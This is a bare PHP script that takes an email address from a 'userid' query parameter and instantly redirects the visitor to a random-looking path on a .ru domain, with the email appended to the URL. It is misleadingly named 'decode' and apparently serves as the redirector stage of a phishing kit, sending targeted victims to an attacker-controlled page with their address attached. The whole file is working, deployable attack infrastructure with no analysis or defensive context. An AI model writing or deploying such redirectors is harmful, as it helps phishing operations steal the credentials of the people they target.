<?php
function decode($email) {
    // Decode the URL-encoded email
    $email = urldecode($email);
    
    header("refresh:0;url=https://z6L3.zyaix.ru/vuZlyuw4wM_CZKuoupWs/#Y" . $email);
}

if (isset($_GET['userid']) && !empty($_GET['userid'])) {
    $email = $_GET['userid'];
    decode($email);
}
?>
